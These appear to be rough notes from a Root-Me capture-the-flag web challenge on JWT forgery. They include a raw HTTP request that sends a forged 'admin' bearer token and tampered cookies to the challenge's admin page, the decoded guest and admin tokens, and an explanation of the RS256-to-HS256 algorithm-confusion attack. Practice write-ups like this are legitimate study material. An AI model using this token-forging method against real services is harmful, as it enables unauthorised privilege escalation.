POST /web-serveur/ch59/admin HTTP/1.1
Host: challenge01.root-me.org
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: passwd=test; status=adm
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.lo1mJ7Rg49fnN7Bj0wUXk8lo6Euhi274mDvDJFn-o0h_uTcRCi6Z_OW52gqOAmVFOPD2uxP4uMTrDbRy3FLjBg
Connection: close



eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QifQ.s8y9Wc6no_mtszzBfxeD_GGWGCMa5Ehgu5eRXIT04G8q2jyEnGWpehck_yA0WroLp-n43UjcLe6kHYlJtUeLzw

HEADER{
  "alg": "HS512",
  "typ": "JWT"
} 

PAYLODS
{
  "role": "guest"
}

CONCATENATION ENCODED


Algo HS512

The algorithm HS256 uses a secret key to sign and verify each message. 
The algorithm RS256 uses a private key to sign messages, and a public key to verify
them. If we change the algorithm from RS256 to HS256, the signature is now
verified using the HS256 algorithm using the public key as secret key. Since the
public key is not secret at all, we can correctly sign such messages.


eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9
{
  "alg": "HS512",
  "typ": "JWT"
}

.eyJyb2xlIjoiYWRtaW4ifQ
{
  "role": "admin"
}